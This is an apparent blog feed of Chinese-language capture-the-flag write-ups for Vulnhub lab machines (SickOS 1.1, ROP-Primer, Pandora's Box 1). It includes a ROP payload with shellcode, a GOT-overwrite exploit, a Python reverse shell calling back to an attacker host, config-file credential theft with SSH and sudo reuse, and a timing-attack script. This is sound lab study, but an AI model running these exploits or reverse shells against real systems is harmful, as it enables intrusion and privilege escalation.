  <span class="p">|</span>_________<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>

                  Celebrating <span class="m">50</span> years of Pink Floyd!
             Syd Barrett <span class="o">(</span>RIP<span class="o">)</span>, Nick Mason, Roger Waters,
               Richard Wright <span class="o">(</span>RIP<span class="o">)</span>, and David Gilmour.


** Shoutouts **
+ @vulnhub <span class="k">for</span> making it all possible
+ @rastamouse @thecolonial - <span class="s2">&quot;the test bunnies&quot;</span>

-<span class="o">=========================================</span>-
-  xerubus <span class="o">(</span>@xerubus - www.mogozobo.com<span class="o">)</span>  -
-<span class="o">=========================================</span>-
<span class="c">#</span></code></pre></div>


<p>花了6個小時終於拿到flag了T<sup>T</sup></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SickOS 1.1]]></title>
    <link href="http://newdominic.github.io/blog/2015/12/19/sicoks1.1/"/>
    <updated>2015-12-19T00:57:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/12/19/sicoks1.1</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>nmap 先掃一遍目標</p>

<pre><code>root@kali:~/_Sec/sick# nmap -sS -Pn 192.168.2.164 -p-
...
PORT     STATE  SERVICE
22/tcp   open   ssh
3128/tcp open   squid-http
</code></pre>

<p>用瀏覽器連上3128 port之後，會發現架了一個squid-proxy</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-19-sickos1.1/nmap.png"></p>

<p>透過這個proxy就能用瀏覽器連上 <a href="http://192.168.2.164">http://192.168.2.164</a></p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-19-sickos1.1/bleh.png"></p>

<p>這個首頁的原始碼空無一物，先拿nikto來掃看看有沒有漏洞</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sick# nikto -h http://192.168.2.164 -useproxy http://192.168.2.164:3128
...
+ <span class="s2">&quot;robots.txt&quot;</span> contains <span class="m">1</span> entry which should be manually viewed.</code></pre></div>


<p>掃描結果發現有robots.txt，打開來看會得到/wolfcms這個路徑，是個用wolfcms架的blog</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-19-sickos1.1/wolf.png"></p>

<p>google wolfcms exploit之後，看到了這個<a href="https://www.exploit-db.com/exploits/38000/">漏洞</a></p>

<p>但要實際運用必須要先能夠登入，於是來到了登入畫面。</p>

<p>然後！！！！！</p>

<p>猜了五分鐘，最後終於用admin:admin成功登入了</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-19-sickos1.1/admin.png"></p>

<p>再來就要嘗試剛剛找到的poc有沒有效果</p>

<p>上傳一個revershell.php，並在攻擊端設好等待連線之後，再從瀏覽器去瀏覽剛剛上傳的php檔</p>

<p>就成功拿到www-data的shell了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sick# nc -lp 4112
Linux SickOs 3.11.0-15-generic <span class="c">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</span>
 23:58:32 up  4:11,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
<span class="err">$</span></code></pre></div>


<p>檢查一下/etc/passwd，發現有個sickos的帳號</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">www-data@SickOs:/<span class="nv">$ </span>cat /etc/passwd <span class="p">|</span> grep bash
cat /etc/passwd <span class="p">|</span> grep bash
root:x:0:0:root:/root:/bin/bash
sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash</code></pre></div>


<p>到sickos的家目錄逛一下，.bashrc和.profile沒甚麼有用的資訊，.bash_history沒權限</p>

<p>接著去逛逛架站的/var/www目錄，在/wolfcms/config.php會發現連入mysql用的帳密</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">www-data@SickOs:/var/www/wolfcms<span class="nv">$ </span>cat config
define<span class="o">(</span><span class="s1">&#39;DB_DSN&#39;</span>, <span class="s1">&#39;mysql:dbname=wolf;host=localhost;port=3306&#39;</span><span class="o">)</span><span class="p">;</span>
define<span class="o">(</span><span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;root&#39;</span><span class="o">)</span><span class="p">;</span>
define<span class="o">(</span><span class="s1">&#39;DB_PASS&#39;</span>, <span class="s1">&#39;john@123&#39;</span><span class="o">)</span><span class="p">;</span></code></pre></div>


<p>用這組帳密登入mysql後到處逛逛，最後在mysql.user這張表發現從sickos這個host登入用的帳密</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">www-data@SickOs:/var/www/wolfcms<span class="nv">$ </span>mysql -uroot -pjohn@123
...
mysql&gt; <span class="k">select</span> host,user,password from mysql.user<span class="p">;</span>
<span class="k">select</span> host,user,password from mysql.user<span class="p">;</span>
+-----------+------------------+-------------------------------------------+
<span class="p">|</span> host      <span class="p">|</span> user             <span class="p">|</span> password                                  <span class="p">|</span>
+-----------+------------------+-------------------------------------------+
<span class="p">|</span> localhost <span class="p">|</span> root             <span class="p">|</span> *A7A20B93EC076311A63BF86B5C705B25C054DD77 <span class="p">|</span>
<span class="p">|</span> sickos    <span class="p">|</span> root             <span class="p">|</span> *A7A20B93EC076311A63BF86B5C705B25C054DD77 <span class="p">|</span>
<span class="p">|</span> 127.0.0.1 <span class="p">|</span> root             <span class="p">|</span> *A7A20B93EC076311A63BF86B5C705B25C054DD77 <span class="p">|</span>
<span class="p">|</span> ::1       <span class="p">|</span> root             <span class="p">|</span> *A7A20B93EC076311A63BF86B5C705B25C054DD77 <span class="p">|</span>
<span class="p">|</span> localhost <span class="p">|</span> debian-sys-maint <span class="p">|</span> *CB98094782C386F2459D65D97B17D1DE15D1654B <span class="p">|</span>
+-----------+------------------+-------------------------------------------+
<span class="m">5</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span></code></pre></div>


<p>雖然密碼是加密過的，不過跟我們知道目前登入mysql用的密碼就是john@123</p>

<p>用這組密碼就能成功從ssh登入sickos的帳號了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">www-data@SickOs:/var/www/wolfcms<span class="nv">$ </span>ssh sickos@192.168.2.164
ssh sickos@192.168.2.164
The authenticity of host <span class="s1">&#39;192.168.2.164 (192.168.2.164)&#39;</span> can<span class="s1">&#39;t be established.</span>
<span class="s1">ECDSA key fingerprint is 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27.</span>
<span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
<span class="s1">yes</span>
<span class="s1">Warning: Permanently added &#39;</span>192.168.2.164<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
<span class="s1">sickos@192.168.2.164&#39;</span>s password: john@123

...
Last login: Fri Dec <span class="m">18</span> 22:52:51 <span class="m">2015</span> from 192.168.2.145
sickos@SickOs:~<span class="err">$</span></code></pre></div>


<p>登入後就可以看到.bash_history裡有用過sudo su的紀錄</p>

<p>執行後就拿到root的權限，最後就是抓flag了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">sickos@SickOs:~<span class="nv">$ </span>sudo su
sudo su
<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> sickos: john@123

root@SickOs:/home/sickos# ls -al /root
ls -al /root
total 40
drwx------  <span class="m">3</span> root root <span class="m">4096</span> Dec  <span class="m">6</span> 21:14 .
drwxr-xr-x <span class="m">22</span> root root <span class="m">4096</span> Sep <span class="m">22</span> 08:13 ..
-rw-r--r--  <span class="m">1</span> root root   <span class="m">96</span> Dec  <span class="m">6</span> 07:27 a0216ea4d51874464078c618298b1367.txt
-rw-------  <span class="m">1</span> root root <span class="m">3783</span> Dec <span class="m">18</span> 23:57 .bash_history
-rw-r--r--  <span class="m">1</span> root root <span class="m">3106</span> Apr <span class="m">19</span>  <span class="m">2012</span> .bashrc
drwx------  <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">22</span> 08:33 .cache
-rw-------  <span class="m">1</span> root root   <span class="m">22</span> Dec  <span class="m">5</span> 06:24 .mysql_history
-rw-r--r--  <span class="m">1</span> root root  <span class="m">140</span> Apr <span class="m">19</span>  <span class="m">2012</span> .profile
-rw-------  <span class="m">1</span> root root <span class="m">5230</span> Dec  <span class="m">6</span> 21:14 .viminfo
root@SickOs:/home/sickos# cat /root/a0216ea4d51874464078c618298b1367.txt
cat /root/a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks <span class="k">for</span> Trying


root@SickOs:/home/sickos#</code></pre></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ROP-Primer Level 0]]></title>
    <link href="http://newdominic.github.io/blog/2015/04/16/rop-primer/"/>
    <updated>2015-04-16T01:12:03+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/04/16/rop-primer</id>
    <content type="html"><![CDATA[<p>ROP-Primer</p>

<!--more-->


<hr />

<p><strong><em>Level 0</em></strong></p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

    <span class="kn">import</span> <span class="nn">struct</span>

    <span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span><span class="n">x</span><span class="p">)</span>

    <span class="n">payload</span><span class="o">=</span><span class="s">&quot;&quot;</span>
    <span class="n">payload</span><span class="o">+=</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">44</span>

    <span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x080523e0</span><span class="p">)</span>   <span class="c">#mprotect@plt</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x08048882</span><span class="p">)</span>   <span class="c">#pppr</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0xbfff5000</span><span class="p">)</span>   <span class="c">#addr</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>       <span class="c">#page-aligned size</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>          <span class="c">#PROT_READ|PROT_WRITE|PROT_EXEC</span>

    <span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x80517f0</span><span class="p">)</span>    <span class="c">#read@plt</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x08048882</span><span class="p">)</span>   <span class="c">#pppr</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>          <span class="c">#fd=SDIN</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0xbfff5000</span><span class="p">)</span>   <span class="c">#addr</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>        <span class="c">#length</span>

    <span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0xbfff5000</span><span class="p">)</span>   <span class="c">#address of shellcode</span>
    
    <span class="k">print</span> <span class="n">payload</span></code></pre></div>


<pre><code>level0@rop:~$ (./gen.py ;python -c 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'; cat) | ./level0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAà‚!
id
uid=1000(level0) gid=1000(level0) euid=1001(level1) groups=1001(level1),1000(level0)
</code></pre>

<hr />

<p><strong><em>Level 1</em></strong></p>

<p>Line 71,72
filesize &lt; sizeof (filename)</p>

<p>gdb-peda$ ropgadget
ret = 0x804851c
popret = 0x8048e93
pop2ret = 0x8048ef7
pop3ret = 0x8048ef6
pop4ret = 0x8048ef5
leaveret = 0x8048610
addesp_44 = 0x8048ef2</p>

<p>0x8049128 &ldquo;flag&rdquo;</p>

<p>0xf7f27620 <open>
0xf7f27aa0 <read>
0xf7f27b20 <write></p>

<p>fd[eax]=open(&ldquo;flag&rdquo;,?,?)
read(fd,buf_addr,size)
write(stdout[1], buf_addr, size)</p>

<p>b <em>0x08048d8c
set </em>0xbffff6c0=0x22ba
set follow-fork-mode child
b <em>0x8048a34 (store)
b </em>0x08048c5b (read)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pandora's Box 1 - Level 2]]></title>
    <link href="http://newdominic.github.io/blog/2015/03/23/pandora1_level2/"/>
    <updated>2015-03-23T02:00:03+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/03/23/pandora1_level2</id>
    <content type="html"><![CDATA[<p>接續上篇<a href="../../../03/12/pandora1_level1/">Pandora&rsquo;s Box 1 - Level 1</a></p>

<!--more-->


<hr />

<pre><code>Shell$ ls
drwxr-x--- 4 level1 level1  4096 Mar 16 12:49 .
drwxr-xr-x 7 root   root    4096 Jan  3 21:56 ..
-rwsr-xr-x 1 level2 level1  9052 Jan  4 08:58 level2
-rw-r--r-- 1 level1 level1   145 Jan  4 09:00 level2_readme.txt
Shell$ cat level2_readme.txt
Start this level with socat 'socat TCP4-listen:53121,reuseaddr,fork EXEC:./level2' and use netcat or whatever to communicate with it.

Have fun!
</code></pre>

<p>level2有設sticky bit，看起來要透過它取得level2的權限</p>

<p>提示說要用socat執行level2，不過還是先試試能不能直接執行</p>

<pre><code>level1@pb0x:~$ ./level2
[*] Notes manager - 1.0
[*] Type help for the command list
&gt; help
Command list:
        Create new note     : new
        Set note text       : set
        Show note text      : show
        Delete note         : del
        Show commands       : help
        Exit                : exit
&gt;
</code></pre>

<p>看起來像個筆記本程式，有新增、編輯、顯示、刪除的功能</p>

<p>操作之後會發現在編輯(set)時，輸入過長的字元後，要讀取下一個編號的內容會造成crash</p>

<pre><code>[*] Notes manager - 1.0
[*] Type help for the command list
&gt; new
[*] New note created with id 0
&gt; new
[*] New note created with id 1
&gt; set
&gt; id: 0
&gt; text(32 max): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[*] Note 0 set
&gt; [!] Invalid command, try help
&gt; &gt; read 1
[!] Invalid command, try help
&gt; show
&gt; id: 1
Segmentation fault
</code></pre>

<p>接著進gdb重現一下當機，看看有沒有可以利用的部分</p>

<pre><code>level1@pb0x:~$ gdb -q level2
Reading symbols from /home/level1/level2...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/level1/level2
[*] Notes manager - 1.0
[*] Type help for the command list
&gt; new
[*] New note created with id 0
&gt; new
[*] New note created with id 1
&gt; set
&gt; id: 0
&gt; text(32 max): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                          AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[*] Note 0 set
&gt; [!] Invalid command, try help
&gt; show
&gt; id: 1

Program received signal SIGSEGV, Segmentation fault.
0xb7606e59 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) i r
eax            0x0      0
ecx            0xffffffff       -1
edx            0x0      0
ebx            0xb7768ff4       -1216966668
esp            0xbf869770       0xbf869770
ebp            0xbf869d28       0xbf869d28
esi            0xb7769a20       -1216964064
edi            0x41414141       1094795585
eip            0xb7606e59       0xb7606e59 &lt;vfprintf+9081&gt;
eflags         0x10246  [ PF ZF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
</code></pre>

<p>這邊可以看到edi被我們的輸入蓋過去了，繼續分析一下level2</p>

<pre><code>(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048720  frame_dummy
0x0804874c  show_welcome
0x08048779  show_help
0x080487d5  stripnewline
0x08048821  create_struct
0x0804887e  free_struct
0x0804889f  get_empty_slot
0x080488dd  slot_exists
</code></pre>

<p>找到了幾個像是自定義的函式，大概看一下之後發現create_struct裡面有呼叫malloc，繼續深入了解一下</p>

<pre><code>(gdb) disas create_struct
Dump of assembler code for function create_struct:
   0x08048821 &lt;+0&gt;:     push   %ebp
   0x08048822 &lt;+1&gt;:     mov    %esp,%ebp
   0x08048824 &lt;+3&gt;:     sub    $0x28,%esp
   0x08048827 &lt;+6&gt;:     movl   $0x8,(%esp)
   0x0804882e &lt;+13&gt;:    call   0x80485e0 &lt;malloc@plt&gt;
   0x08048833 &lt;+18&gt;:    mov    %eax,-0xc(%ebp)
   0x08048836 &lt;+21&gt;:    mov    -0xc(%ebp),%eax
   0x08048839 &lt;+24&gt;:    movl   $0x40,(%eax)
   0x0804883f &lt;+30&gt;:    mov    -0xc(%ebp),%eax
   0x08048842 &lt;+33&gt;:    mov    (%eax),%eax
   0x08048844 &lt;+35&gt;:    mov    %eax,(%esp)
   0x08048847 &lt;+38&gt;:    call   0x80485e0 &lt;malloc@plt&gt;
   0x0804884c &lt;+43&gt;:    mov    %eax,%edx
   0x0804884e &lt;+45&gt;:    mov    -0xc(%ebp),%eax
   0x08048851 &lt;+48&gt;:    mov    %edx,0x4(%eax)
   0x08048854 &lt;+51&gt;:    mov    -0xc(%ebp),%eax
   0x08048857 &lt;+54&gt;:    mov    (%eax),%eax
   0x08048859 &lt;+56&gt;:    mov    -0xc(%ebp),%edx
   0x0804885c &lt;+59&gt;:    mov    0x4(%edx),%edx
   0x0804885f &lt;+62&gt;:    and    $0xfffff000,%edx
   0x08048865 &lt;+68&gt;:    movl   $0x7,0x8(%esp)
   0x0804886d &lt;+76&gt;:    mov    %eax,0x4(%esp)
   0x08048871 &lt;+80&gt;:    mov    %edx,(%esp)
   0x08048874 &lt;+83&gt;:    call   0x8048570 &lt;mprotect@plt&gt;
   0x08048879 &lt;+88&gt;:    mov    -0xc(%ebp),%eax
   0x0804887c &lt;+91&gt;:    leave
   0x0804887d &lt;+92&gt;:    ret
End of assembler dump.
</code></pre>

<p>malloc的部分，看起來是建立了兩個連續的空間</p>

<p>第一次建立的大小是8 bytes，第二次是64 bytes，8 bytes中的4個bytes會用來指向64 bytes的所在位址</p>

<p>最後則是作者佛心來著(?)，用mprotect把64 bytes的區塊設定成可讀可寫可執行的狀態????</p>

<p>接下來驗證一下是不是真的有辦法修改這塊記憶體</p>

<pre><code>(gdb) r
Starting program: /home/level1/level2
[*] Notes manager - 1.0
[*] Type help for the command list
&gt; new
[*] New note created with id 0
&gt; new
[*] New note created with id 1
&gt; set
&gt; id: 0
&gt; text(32 max): Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
[*] Note 0 set
&gt; show
&gt; id: 1

Program received signal SIGSEGV, Segmentation fault.
0xb75c2e59 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x $edi
0x63413563:     Cannot access memory at address 0x63413563

root@kali:~/_Sec/vulnhub/pandora# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x63413563
[*] Exact match at offset 76
</code></pre>

<p>用pattern_create.rb和pattern_offset.rb找出長度之後，接著來試試看能不能用set 1去修改set 0時覆蓋過去的記憶體位址</p>

<p>再來要找一個這支程式很常用到的函式，去修改他指向的記憶體位址，等這個函式被調用的時候就會去執行我們指定的程式碼區段</p>

<p>而這可憐的函式就決定是printf了，我們有PLT和GOT兩個入口可以選擇，不過檢查一下會發現PLT的區塊是唯讀的，那就只剩下GOT的printf可以用了</p>

<pre><code>level1@pb0x:~$ objdump -h level2
 12 .plt          00000110  08048550  08048550  00000550  2**4
              CONTENTS, ALLOC, LOAD, READONLY, CODE

level1@pb0x:~$ objdump -R level2

level2:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
0804a370 R_386_JUMP_SLOT   printf
</code></pre>

<p>找到GOT的位置後，再來要替換GOT指向的記憶體位址</p>

<p>這邊選擇了system，使用ret2libc的方式，直接呼叫system去執行程式</p>

<p>在替換的過程遇到了點問題，因為ASLR是開著的，所以system的位址每次都會變動</p>

<p>而且level1沒有權限去改/proc/sys/kernel/randomize_va_space的內容</p>

<p>最後靠著google大神找到了一個神奇的解法，在32-bit的機器上只要下一個指令就能暫時無視ASLR了</p>

<pre><code>level1@pb0x:~$ ldd level2
        linux-gate.so.1 =&gt;  (0xb7795000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75e4000)
        /lib/ld-linux.so.2 (0xb7796000)
level1@pb0x:~$ ldd level2
        linux-gate.so.1 =&gt;  (0xb774d000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb759c000)
        /lib/ld-linux.so.2 (0xb774e000)
level1@pb0x:~$ ldd level2
        linux-gate.so.1 =&gt;  (0xb7724000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7573000)
        /lib/ld-linux.so.2 (0xb7725000)
level1@pb0x:~$ ulimit -s 9999999999
level1@pb0x:~$ ldd level2
        linux-gate.so.1 =&gt;  (0x40022000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x40029000)
        /lib/ld-linux.so.2 (0x40000000)
level1@pb0x:~$ ldd level2
        linux-gate.so.1 =&gt;  (0x40022000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x40029000)
        /lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>解除ASLR之後，在gdb就能找到system的位址了</p>

<pre><code>(gdb) p system
$1 = {&lt;text variable, no debug info&gt;} 0x40068460 &lt;system&gt;
</code></pre>

<p>最後再把完整的exploit拼起來</p>

<pre><code>level1@pb0x:~$ python -c 'print "new\nnew\nset\n0\n"+"A"*76+"\x70\xa3\x04\x08"+"\nset\n1\n"+"\x60\x84\x06\x40"+"\nexit\n"' &gt; input.hack
level1@pb0x:~$ ./level2 &lt; input.hack
[*] Notes manager - 1.0
[*] Type help for the command list
&gt; [*] New note created with id 0
&gt; [*] New note created with id 1
&gt; &gt; id: &gt; text(32 max): [*] Note 0 set
&gt; &gt; id: &gt; text(32 max): sh: 1: [*]: not found
&gt; [*] Goodbye
</code></pre>

<p>看來餵給system的檔名為&#8221;[*]&ldquo;，再來只要建立一個名為[*]檔案，裡面看要怎麼操作都可以</p>

<p>這邊寫一個reverse shell接回Kali Linux。等Kali把listen port架起來後，執行level2就能拿到level2的權限囉</p>

<pre><code>level1@pb0x:~$ cat [*]
#!/usr/bin/python

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.2.128",9922))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

level1@pb0x:~$ ./level2 &lt; input.hack
[*] Notes manager - 1.0
[*] Type help for the command list
&gt; [*] New note created with id 0
&gt; [*] New note created with id 1
&gt; &gt; id: &gt; text(32 max): [*] Note 0 set
&gt; &gt; id: &gt; text(32 max):

root@kali:~# nc -lvp 9922
listening on [any] 9922 ...
192.168.2.158: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.2.128] from (UNKNOWN) [192.168.2.158] 50702
$ id
uid=1001(level1) gid=1001(level1) euid=1002(level2) groups=1002(level2),1001(level1)
$ whoami
level2
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pandora's Box 1 - Level 1]]></title>
    <link href="http://newdominic.github.io/blog/2015/03/12/pandora1_level1/"/>
    <updated>2015-03-12T22:15:48+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/03/12/pandora1_level1</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/pandoras-box-1,111/">Pandora&rsquo;s Box 1</a>，還是<a href="https://www.vulnhub.com/">Vulnhub</a>的Vulnerable Machine，作者是<a href="https://www.vulnhub.com/author/c0ne,119/">c0ne</a></p>

<!--more-->


<hr />

<p>先用nmap掃描目標，除了port 22的ssh之外，port 54311上也有執行程式</p>

<pre><code>Starting Nmap 6.46 ( http://nmap.org ) at 2015-01-03 00:35 EST
Nmap scan report for 192.168.2.158
Host is up (0.00019s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol
2.0)
54311/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version,
please submit the following fingerprint at http://www.insecure.org/cgi-bin/servi
cefp-submit.cgi :
SF-Port54311-TCP:V=6.46%I=7%D=1/3%Time=54A77FA8%P=x86_64-unknown-linux-gnu
SF:%r(NULL,69,"#######################\n#\x20Secure\x20Remote\x20Shell\x20
SF:#\n#######################\nWelcome,\x20please\x20log\x20in\nPassword:\
SF:x20")%r(GenericLines,73,"#######################\n#\x20Secure\x20Remote
SF:\x20Shell\x20#\n#######################\nWelcome,\x20please\x20log\x20i
SF:n\nPassword:\x20Password:\x20")%r(GetRequest,85,"######################
SF:#\n#\x20Secure\x20Remote\x20Shell\x20#\n#######################\nWelcom
SF:e,\x20please\x20log\x20in\nPassword:\x20Invalid\x20password!\nPassword:
SF:\x20")%r(HTTPOptions,85,"#######################\n#\x20Secure\x20Remote
SF:\x20Shell\x20#\n#######################\nWelcome,\x20please\x20log\x20i
SF:n\nPassword:\x20Invalid\x20password!\nPassword:\x20")%r(RTSPRequest,85,
SF:"#######################\n#\x20Secure\x20Remote\x20Shell\x20#\n########
SF:###############\nWelcome,\x20please\x20log\x20in\nPassword:\x20Invalid\
SF:x20password!\nPassword:\x20")%r(RPCCheck,85,"#######################\n#
SF:\x20Secure\x20Remote\x20Shell\x20#\n#######################\nWelcome,\x
SF:20please\x20log\x20in\nPassword:\x20Invalid\x20password!\nPassword:\x20
SF:")%r(DNSVersionBindReq,73,"#######################\n#\x20Secure\x20Remo
SF:te\x20Shell\x20#\n#######################\nWelcome,\x20please\x20log\x2
SF:0in\nPassword:\x20Password:\x20")%r(DNSStatusRequest,73,"##############
SF:#########\n#\x20Secure\x20Remote\x20Shell\x20#\n#######################
SF:\nWelcome,\x20please\x20log\x20in\nPassword:\x20Password:\x20")%r(Help,
SF:85,"#######################\n#\x20Secure\x20Remote\x20Shell\x20#\n#####
SF:##################\nWelcome,\x20please\x20log\x20in\nPassword:\x20Inval
SF:id\x20password!\nPassword:\x20")%r(SSLSessionReq,A1,"##################
SF:#####\n#\x20Secure\x20Remote\x20Shell\x20#\n#######################\nWe
SF:lcome,\x20please\x20log\x20in\nPassword:\x20Invalid\x20password!\nPassw
SF:ord:\x20Invalid\x20password!\nPassword:\x20")%r(Kerberos,8F,"##########
SF:#############\n#\x20Secure\x20Remote\x20Shell\x20#\n###################
SF:####\nWelcome,\x20please\x20log\x20in\nPassword:\x20Password:\x20Invali
SF:d\x20password!\nPassword:\x20");
MAC Address: 00:0C:29:35:8B:92 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.
org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.78 seconds
</code></pre>

<p>連上54311後會看到要求輸入密碼</p>

<pre><code>root@kali:~/_Sec/vulnhub/pandora# nc 192.168.2.158 54311
#######################
# Secure Remote Shell #
#######################
Welcome, please log in
Password:
</code></pre>

<p>盲目地試過一些弱密碼，也用了Kali Linux內建的rockyou.txt跑了一陣子都沒有效果</p>

<p>在嘗試Buffer overflow時，發現密碼的長度在超過64個字之後，會回傳兩次的錯誤訊息</p>

<p>而且還有一件更有趣的事情：每次送出密碼到回傳訊息之間的間隔時間似乎不太一樣</p>

<p>這個看起來說不定能用跑起來非常帥氣的<a href="http://en.wikipedia.org/wiki/Timing_attack">Timing Attack</a>來解</p>

<p>先寫一段簡單的code來跑看看每一個字元的花費時間</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

    <span class="kn">import</span> <span class="nn">string</span>
    <span class="kn">import</span> <span class="nn">time</span>
    <span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
    <span class="n">readable</span><span class="o">=</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">punctuation</span>
